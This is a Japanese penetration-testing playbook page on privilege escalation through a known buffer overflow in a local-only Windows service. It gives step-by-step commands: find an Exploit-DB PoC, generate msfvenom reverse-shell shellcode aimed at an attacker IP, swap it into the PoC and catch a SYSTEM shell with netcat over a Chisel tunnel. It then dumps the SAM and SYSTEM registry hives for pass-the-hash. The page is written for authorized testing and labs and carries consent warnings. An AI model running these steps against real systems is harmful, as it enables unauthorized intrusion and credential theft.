# 既知 Buffer Overflow（Exploit-DB PoC 悪用）

ローカルにしか公開されていないサービスに対して、Exploit-DB 等に公開された PoC（概念実証コード）を
msfvenom で生成したシェルコードに置き換えて権限昇格を行う手法。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（対象サービスがクラッシュする場合がある）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [ ] SIEM/EDR で確実に検知される
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

---

## 着火条件

- ローカルにしか公開されていないサービスが特定できた（`netstat` で `127.0.0.1:[PORT]` が LISTENING）
- そのサービスの名前・バージョンが判明した（`tasklist`・インストール済みソフト一覧・ダウンロードフォルダのバイナリ名から）
- searchsploit または Exploit-DB に **そのバージョン向けの Buffer Overflow PoC** が存在する

> **着火シグナル：** `tasklist` で判明したプロセス名 + バージョンを `searchsploit` に渡したときに
> 「Buffer Overflow」「SEH Overflow」のヒットがある。

### 環境前提

- 実行環境: テスター端末（PoC の修正・シェルコード生成・リスナー起動・実行）
- 必要なツール:
  - `searchsploit`（ペネトレ用Linuxディストリ標準）
  - `msfvenom`（Metasploit Framework 付属、ペネトレ用Linuxディストリ標準）
  - `nc`（netcat、標準搭載）
  - `chisel`（ポートフォワーディング用 → `../05_Tools_Reference/Chisel.md`）
- オフライン環境: msfvenom は Metasploit Framework がインストールされていれば動作（オフライン可）

---

## 観点・着眼点

**先に確認すること：**
1. `netstat -ano | findstr ":0"` → ローカルポートとPIDを確認
2. `tasklist /FI "PID eq [PID]"` → サービス名を確認
3. インストールディレクトリ・ダウンロードフォルダでバージョン番号を確認
4. `searchsploit [サービス名] [バージョン]` → PoC の有無を確認

**攻撃者の思考トレース：** Exploit-DB の PoC は「calc.exe を起動する」等のデモ用シェルコードが入っていることが多い。
ここを **msfvenom で生成したリバースシェルのシェルコード** に差し替えるだけで動くことがほとんど。
変更が必要なのは `payload` 変数の中身と、`LHOST`・`LPORT` の値のみ。

**msfvenom のオプション：**

- `-a x86` / `-a x64`: ターゲットのアーキテクチャ（32bit か 64bit か。`systeminfo` で確認）
- `-p windows/shell_reverse_tcp`: ステージレスのリバースシェル（受け取り側に Metasploit 不要）
- `-b '\x00\x0A\x0D'`: バッファオーバーフロー系では NULL バイト・改行文字が終端として扱われるため除外する
- `-f python -v payload`: Python 変数形式で出力（`payload += b"..."` の形）

---

## 手順

**Step 1: PoC を特定してダウンロード**

```bash
# [Attacker] サービス名とバージョンで検索
searchsploit [サービス名] [バージョン]
# 例：searchsploit cloudme 1.11
# → 「[SERVICE_NAME] [VERSION] - Buffer Overflow (PoC)」等がヒット

# 作業ディレクトリにコピー
searchsploit -m [PATH_FROM_RESULTS]
# 例：searchsploit -m windows/local/48389.py
```

**Step 2: PoC の内容を確認して置き換え箇所を特定**

```bash
# [Attacker]
cat [poc.py]
```

確認すべき箇所：
- `padding1` の長さ（EIP までのオフセット）
- `EIP` の値（JMP ESP アドレス等）
- `payload` 変数（ここを差し替える）
- `target` と接続先ポート番号

**Step 3: msfvenom でシェルコードを生成**

**事前準備（必須）：** テスター端末のリバースシェル受け取りIPを確認してから生成する（`ip a`）。

```bash
# [Attacker] 32bit Windows 向けリバースシェルのシェルコード生成
msfvenom -a x86 -p windows/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[LISTEN_PORT] \
  -b '\x00\x0A\x0D' \
  -f python -v payload
# 出力例：
# payload = b""
# payload += b"\xbd\xd9\xd7\x2b..."
# ...（複数行）

# 64bit Windows 向けの場合
msfvenom -a x64 -p windows/x64/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[LISTEN_PORT] \
  -b '\x00\x0A\x0D' \
  -f python -v payload
```

**Step 4: PoC のシェルコードを差し替える**

```python
# 元の PoC の payload 変数（デモ用）を削除して msfvenom の出力に置き換える
# 変更前（例）：
payload = b"\xba\xad\x1e\x7c..."   # ← このブロック全体を

# 変更後（msfvenom の出力で置き換える）：
payload  = b""
payload += b"\xbd\xd9\xd7\x2b..."
# ...（msfvenom が出力した全行）
```

接続先も確認・修正する：
```python
target = "127.0.0.1"   # Chisel でポートフォワードしている場合はこのまま
port   = 8888          # netstat で確認したポート番号
```

**Step 5: リスナーを起動してエクスプロイトを実行**

```bash
# [Attacker] リバースシェルのリスナー起動（別ターミナル）
nc -lnvp [LISTEN_PORT]
```

```bash
# [Attacker] Chisel でポートフォワーディングが確立済みであることを確認してから実行
python3 poc.py
# → nc リスナーにシェルが返ってくる
```

**接続確認：**
```
connect to [[ATTACKER_IP]] from (UNKNOWN) [TARGET_IP] [PORT]
Microsoft Windows [Version ...]

C:\Windows\system32> whoami
nt authority\system   # または administrator 等、対象サービスの実行ユーザー
```

---

## 刺さらなかったとき

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| スクリプトを実行してもシェルが返らない | シェルコードのアーキテクチャ（32/64bit）不一致 | `systeminfo` で OS アーキテクチャを確認して msfvenom の `-a` を変える |
| スクリプトがエラーで落ちる（接続拒否） | Chisel のトンネルが切れている / ポート番号が違う | テスター端末で `chisel server` が生きているか確認。`netstat` で再確認 |
| シェルコードに bad character が含まれている | PoC 作者と自分の環境でバイト列が違う | PoC の冒頭コメントで bad character リストを確認して `-b` に追加 |
| サービスがクラッシュして再起動しない | サービスが自動再起動しない設定 | 一定時間待つ / 別の手法（Potato 系等）を検討 |
| msfvenom のシェルコードが長すぎる | バッファサイズ超過 | `-e x86/shikata_ga_nai` エンコーダを外す / ペイロードサイズを確認して `overrun` バイトで調整 |

---

## 注意点・落とし穴

- **PoC を実行する前に必ず `nc -lnvp` でリスナーを起動する。** 起動なしで実行するとシェルコードが実行されてもリスナーがおらず接続が切れる
- **アーキテクチャの確認を最初に行う。** `Get-ComputerInfo` や `systeminfo` の `System Type` フィールドで 32/64bit を確認してから msfvenom の `-a` を選ぶ
- **PoC のシェルコード差し替えは `payload` 変数の全行を置き換える。** 一部だけ残すとハイブリッドになってクラッシュする
- サービスが既にクラッシュしている場合は再起動されるのを待つか、別のアプローチを検討する

### 昇格成功後に確認すること（横展開観点）

```powershell
# [Target] SYSTEM / Administrator 権限取得後
whoami

# SAM データベース（ローカルユーザーの NTLM ハッシュ）を取得
# → 他システムへの Pass-The-Hash に使える
reg save HKLM\SAM C:\Users\Public\sam.bak
reg save HKLM\SYSTEM C:\Users\Public\system.bak
# [Attacker] 取得
# python3 -m impacket.secretsdump -sam sam.bak -system system.bak LOCAL
```

→ SAM / SYSTEM ダンプの詳細: `Credential_Dumping.md`

### 本番での前提

- **事前合意の要否**: ★★★（対象サービスがクラッシュするリスクがあるため書面承認必須）
- **想定されるSIEM/EDR検知**: プロセス異常終了アラート / PowerShell / msfvenom ペイロードのシグネチャ
- **業務影響リスク**: 対象サービスの一時停止・クラッシュ（自動再起動設定に依存）
- **原状回復必須項目**: ✅ 転送したバイナリ（nc.exe・chisel.exe 等）を削除
- **取得情報の取扱**: 取得したシェルのセッション・SAMハッシュは案件終了時破棄
- **演習環境での扱い**: 制約なし

### 関連技術

- 前：ローカルポートの発見（netstat） → `./Enumeration_Checklist.md`（Step 1.5）
- 前：Chisel でポートフォワーディング → `../05_Tools_Reference/Chisel.md`
- 前：searchsploit で PoC を特定 → `../05_Tools_Reference/Searchsploit.md`
- 後：SAM ダンプで認証情報取得 → `./Credential_Dumping.md`
